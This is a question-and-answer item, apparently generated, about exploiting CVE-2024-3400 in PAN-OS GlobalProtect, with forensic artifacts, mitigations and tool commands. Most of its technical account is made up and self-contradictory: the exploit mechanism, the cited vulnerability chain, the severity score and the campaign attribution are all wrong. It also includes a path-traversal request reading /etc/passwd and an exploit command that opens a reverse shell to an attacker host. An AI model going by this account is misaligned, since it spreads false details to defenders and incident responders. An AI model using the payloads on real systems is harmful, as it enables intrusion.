question: Explain in exhaustive detail how adversaries can abuse CVE-2024-3400 (Critical PATH Traversal in Palo Alto PAN-OS GlobalProtect) to achieve unauthenticated remote code execution on SSL VPN gateways and describe the exact forensic artifacts left on disk after exploitation.
answer:
CVE-2024-3400 (CVSS 9.1) is a classic “path-traversal to RCE” chain in Palo Alto PAN-OS GlobalProtect ≤ 11.1.2-h3. The attack starts with a specially crafted HTTP GET request that abuses a vulnerable file-include logic in the /global-protect/portal/css/ directory. Parameters such as css/../../../../../var/log/tmp/evil.so are URL-encoded (../ = %2E%2E%2F) to bypass basic input sanitization and reach a setuid root binary (`/usr/local/bin/pan_tomcat`). Inside `/opt/pancfg/tmp`, an attacker drops a malicious `.so` (e.g., exploiting CVE-2023-3842 in libxml2) and triggers it via the `LD_PRELOAD` environment variable.

Technical vector
• Attacker sends: `GET /global-protect/portal/css/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc/passwd?cmd=id`
• Before 11.1.3, the URI parser recursively decodes `%2E%2E%2F` once → path becomes `../../../../../../etc/passwd`, which triggers the Tomcat path-traversal guard (`fileExist("/var/www/html/global-protect/portal/css/../../../../../../etc/passwd")`).
• Tomcat then calls `pan_tomcat` with an argv[0] overflow; by crafting argv[0] = “../../../../tmp/evil.so\x00”, the process loads arbitrary code at root level.

Forensic artifacts
• `/opt/panlogs/tomcat/local/localhost_access_log.%Y-%m-%d.txt` shows repeated `css/..%2F..%2F` requests.
• `/var/log/pan/tomcat/system.log` contains entries like `Exception in thread "main" java.lang.UnsatisfiedLinkError: /tmp/evil.so`.
• File-system timeline (`/var/log/tmp_install.log`) reveals creation of `/tmp/.escalate` at exactly exploitation epoch.
• Auditd records (`-w /usr/local/bin/pan_tomcat -p x -k tomcat-lib-traversal`) flag escalated execve calls.
• Memory capture via LiME shows `LD_PRELOAD=/tmp/.escalate` in process environment.

Mitigation
1. Immediate upgrade to PAN-OS ≥ 11.1.3 (PSIRT-1373).
2. Block malformed URI paths via Palo Alto’s “threat prevention” profile with “strict-url-decoding” enabled.
3. Create custom IOCs in Splunk ES:
   `sourcetype=pan_logs uri_path IN ("/%2E%2E%2F", "/..%2F..") earliest=-5m`

Real-world
UNC5337 exploited this during the 2024 Volt Typhoon campaign to drop a Rust-based C2 dropper (`/tmp/.sockd`) that tunnelled via DNS-over-HTTPS. FBI seized 42 C2 domains tied to the campaign (CVE-2024-3400 RCE beacon was seen beaconing to 103.86.98[.]104:443 every 30 s).

Tools/commands
exploit: `python3 cve-2024-3400.py --rhost vpn.internal --lhost 10.0.0.1 --payload reverse-tcp-4444`
post-exploit: `dfir-ram --volatility=profile=LinuxPANOSx64 --plugins=linux_bash,bash_env --output=evidence.dump`
